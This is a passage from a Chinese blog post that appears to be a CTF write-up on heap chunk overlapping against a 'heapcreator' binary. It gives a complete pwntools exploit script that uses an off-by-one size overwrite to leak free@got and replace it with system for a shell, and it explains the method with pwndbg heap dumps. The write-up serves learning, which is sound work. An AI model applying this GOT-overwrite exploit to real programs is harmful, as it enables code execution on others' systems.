  <li>通过chunk3，覆盖content的addr</li>
  <li>泄漏free的addr并计算offset，得到system地址</li>
  <li>重写free@got为system地址</li>
</ul>

<p>我的脚本如下：</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./heapcreator"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"debug"</span>
<span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./heapcreator"</span><span class="p">)</span>

<span class="n">free_got</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'free'</span><span class="p">]</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"free_got -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">free_got</span><span class="p">))</span>
<span class="n">free_libc_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'free'</span><span class="p">]</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"free_libc_addr -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">free_libc_addr</span><span class="p">))</span>
<span class="n">system_libc_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system_libc_addr -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_libc_addr</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'1'</span><span class="p">)</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">content</span><span class="p">))</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"SuccessFul"</span><span class="p">)</span>
    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Creat success!"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'2'</span><span class="p">)</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">content</span><span class="p">))</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Done !"</span><span class="p">)</span>
    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Edit success!"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'3'</span><span class="p">)</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'4'</span><span class="p">)</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Done !"</span><span class="p">)</span>
    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Delete success!"</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">create</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span><span class="s">'aaaa'</span><span class="p">)</span>
    <span class="n">create</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s">'bbbb'</span><span class="p">)</span>

    <span class="n">content</span> <span class="o">=</span> <span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span> <span class="o">+</span> <span class="s">'a'</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x41</span><span class="s">"</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="n">content</span> <span class="o">=</span> <span class="s">'deadbeef'</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">30</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_got</span><span class="p">)</span>
    <span class="n">create</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>
    <span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">sh</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Content : "</span><span class="p">)</span>
    <span class="n">free_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">sh</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"free_addr -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">free_addr</span><span class="p">))</span>

    <span class="n">offset</span> <span class="o">=</span> <span class="n">free_addr</span> <span class="o">-</span> <span class="n">free_libc_addr</span>
    <span class="n">system_addr</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">system_libc_addr</span>

    <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
    <span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

    <span class="n">sh</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>
<p>这里我们来分析一下这个脚本，首先create了一个0x18的size，这个有什么讲究吗？<br />
答案是显然的，上面我们提到64位时，chunk地址是16字节对齐的，因此我们需要对其调试来确定第一个chunk的size。假如我们申请0x10的size，则heap是这样的：</p>
<pre><code class="language-plain">pwndbg&gt; heap
0x603000 PREV_INUSE {
  mchunk_prev_size = 0, 
  mchunk_size = 657, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603290 FASTBIN {
  mchunk_prev_size = 0, 
  mchunk_size = 33, 
  fd = 0x10, 
  bk = 0x6032c0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x21
}
0x6032b0 FASTBIN {           // chunk1
  mchunk_prev_size = 0, 
  mchunk_size = 33, 
  fd = 0x6161616161616161, 
  bk = 0x6262626262626262, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x20d31
}
0x6032d0 PREV_INUSE {        // chunk2
  mchunk_prev_size = 0, 
  mchunk_size = 134449, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
pwndbg&gt; x/20xg 0x603290
0x603290:       0x0000000000000000      0x0000000000000021
0x6032a0:       0x0000000000000010      0x00000000006032c0
0x6032b0:       0x0000000000000000      0x0000000000000021
0x6032c0:       0x6161616161616161      0x6262626262626262
0x6032d0:       0x0000000000000000      0x0000000000020d31
0x6032e0:       0x0000000000000000      0x0000000000000000

</code></pre>
<p>由于16字节对齐的缘故，导致chunk1并没用占用chunk2的prev_size字段，所以我们也就没法通过off-by-one的漏洞覆盖到size字段。曾经这个细节坑了我很久，我也是读源码的时候看到的。<br />
假如我们分配0x18的size，则heap如下：</p>
<pre><code class="language-plain">0x603290 FASTBIN {
  mchunk_prev_size = 0, 
  mchunk_size = 33, 
  fd = 0x18, 
  bk = 0x6032c0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x21
}
0x6032b0 FASTBIN {
  mchunk_prev_size = 0, 
  mchunk_size = 33, 
  fd = 0x6161616161616161, 
  bk = 0x6262626262626262, 
  fd_nextsize = 0x6363636363636363, 
  bk_nextsize = 0x20d31
}
0x6032d0 PREV_INUSE {
  mchunk_prev_size = 7161677110969590627, 
  mchunk_size = 134449, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
pwndbg&gt; x/20xg 0x603290
0x603290:       0x0000000000000000      0x0000000000000021
0x6032a0:       0x0000000000000018      0x00000000006032c0
0x6032b0:       0x0000000000000000      0x0000000000000021
0x6032c0:       0x6161616161616161      0x6262626262626262
0x6032d0:       0x6363636363636363      0x0000000000020d31
0x6032e0:       0x0000000000000000      0x0000000000000000
0x6032f0:       0x0000000000000000      0x0000000000000000

</code></pre>
<p>这时，chunk1已经占用了chunk2的prev_size字段，因此这一步需要调试然后确定size。<br />
然后在chunk1覆盖chunk2的size后，我们重新分配，这是heap如下：</p>
<pre><code class="language-plain">```plain
+-----------+
+ prev_size +
+-----------+
+  ch_size  +   // chunk3的size
+-----------+
+  content  +&lt;-------|
+           +        |
+           +        |
+-----------+        |
+ prev_size +        |
+-----------+        |
+  ch_size  +        |
+-----------+        |         free@got
+   addr    +--------|-------&gt;+-----------+
+-----------+                 + free_addr +
                              +-----------+
</code></pre>
<p>这里的content是0x30个字节，因此，是可以覆盖到addr的位置的，所以我们把addr修改成free@got，然后泄漏free_addr进而计算offset，然后将其覆盖为system。然后delete掉chunk1直接getshell。<br />
这里比较巧的一个应用是，fastbin被free后进栈，所以addr的chunk会在content下面，这里是十分有意思的一个细节。到此漏洞利用已经基本就完成了。</p>


<div id="vcomments"></div>
<script>
  new Valine({
    el: '#vcomments',
    appId: '9PQd0VOdLBtIrk7DuYhbXgo1-gzGzoHsz',
    appKey: '0tooNX9XI400l94QiuBP0lXm',

    avatar:'robohash',
    visitor: true, // 阅读量统计
    enableQQ: true
  })
</script>

<!-- id 将作为查询条件 -->
<span id=/blog/Chunk-Overlapping class="leancloud_visitors" data-flag-title="Your Article Title">
  <em class="post-meta-item-text">阅读量 </em>
  <i class="leancloud-visitors-count"></i>
</span>

</div>
  </main>

  <footer class="mt-auto py-3 text-center">

  <small class="text-muted mb-2">
    <i class="fas fa-code"></i> with <i class="fas fa-heart"></i>
    by <strong>Yvan</strong>
  </small>

  <div class="container-fluid justify-content-center">

</div><small id="attribution">
    theme <a href="https://github.com/YoussefRaafatNasry/portfolYOU">portfolYOU</a>
  </small>
  
</footer>
  <!-- GitHub Buttons -->
<script async defer src="https://buttons.github.io/buttons.js"></script>

<!-- jQuery CDN -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

<!-- Popper.js CDN -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"></script>

<!-- Bootstrap JS CDN -->
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>

<!-- wow.js CDN & Activation -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/wow/1.1.2/wow.js"></script>
<script> new WOW().init(); </script>

<!-- Initialize all tooltips -->
<script>
$(function () {
    $('[data-toggle="tooltip"]').tooltip()
})
</script>

</body>

</html>